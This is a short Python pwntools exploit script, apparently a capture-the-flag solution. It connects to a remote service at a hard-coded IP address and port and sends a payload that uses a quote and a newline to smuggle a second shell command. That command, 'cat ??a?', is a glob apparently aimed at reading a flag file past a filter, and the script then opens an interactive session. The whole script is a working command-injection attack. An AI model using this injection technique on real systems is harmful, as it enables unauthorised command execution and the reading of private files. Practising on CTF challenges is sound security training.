from pwn import *

p = remote("110.10.147.106", 15959)

#p = process("./20000")

p.recvuntil(": ")
p.sendline(str(10002))

print(p.recvuntil("?"))

p.sendline('." ' + '\n' + 'cat ??a? "')

p.interactive()
